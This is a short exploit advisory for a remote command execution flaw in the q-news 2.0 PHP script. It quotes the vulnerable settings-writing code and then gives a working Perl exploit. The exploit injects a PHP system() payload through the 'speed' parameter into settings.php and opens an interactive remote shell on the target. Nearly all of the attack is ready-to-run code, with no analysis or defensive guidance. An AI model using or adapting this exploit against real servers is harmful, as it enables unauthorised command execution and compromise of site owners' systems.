q-news 2.0 Remote Command Execution Exploit
===========================================


##########################################################################

Author = FireShot , Jacopo Vuga.

Vulnerability = Remote Command Execution
Software = q-news 2.0
Download =
http://ovh.dl.sourceforge.net/sourceforge/php-box/2.0_nologin.zip

###########################################################################

[CODE]

<?php
$filename = &#039;settings.php&#039;;
if (is_writable($filename)) {
    if (!$handle = fopen($filename, &#039;w&#039;)) {
         print "Cannot open file ($filename)";
         exit;
    }
if (!fwrite($handle, "<?php
  \$password = &#039;$password&#039;;
  \$font = &#039;$font&#039;;
  \$height = &#039;$height&#039;;
  \$width = &#039;$width&#039;;
  \$direction = &#039;$direction&#039;;
  \$speed = &#039;$speed&#039;;
  \$bgcolor = &#039;$bgcolor&#039;;
  \$txtcolor = &#039;$txtcolor&#039;;
  \$txtsize = &#039;$txtsize&#039;;
  ?>")) {
        print "Cannot write to file ($filename)";
        exit;
    }
    print "Successfully saved settings to file ($filename)";
    fclose($handle);
                    
} else {
    print "The file $filename is not writable";
}
?>

[/CODE]


[EXPLOIT]

#!/usr/bin/perl


use HTTP::Request;
use LWP::UserAgent;

my $host  =  $ARGV[0];
my $vuln  =  "/wsettings.php?speed=";
my $rce   =  "/settings.php?cmd=";
my $evil  =  "&#039;;system(\$_GET[cmd]);\$x = &#039;";

my $inj_url = $host.$vuln.$evil;
my $rce_url = $host.$rce;

($host) || die " usage= perl $0 site \n"; 

print "------------------------\n";
print "   Q-News RCE Exploit   \n";
print "       by FireShot      \n";
print "------------------------\n\n";

$response = get($inj_url);
if ($response =~ /Successfully saved settings/) {
    &shell;
}
else {
    print "error \n";
    exit(0);
}

sub shell {
    print "FireShot-shell: ";
    my $cmd = <STDIN>;
    $cmd !~ /quit/ || die " exit \n";
    my $url = $rce_url.$cmd;
    my $re = get($url);
    if ($re =~ /(.)/) {
        print $re;
    }
    else {
        print "command unknow \n";
    }
    &shell;
}

sub get() {
    my $url = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $agent  = LWP::UserAgent->new();
    $agent->timeout(4);
    my $response = $agent->request($req);
    return $response->content;
}

[/EXPLOIT]

############################################################################



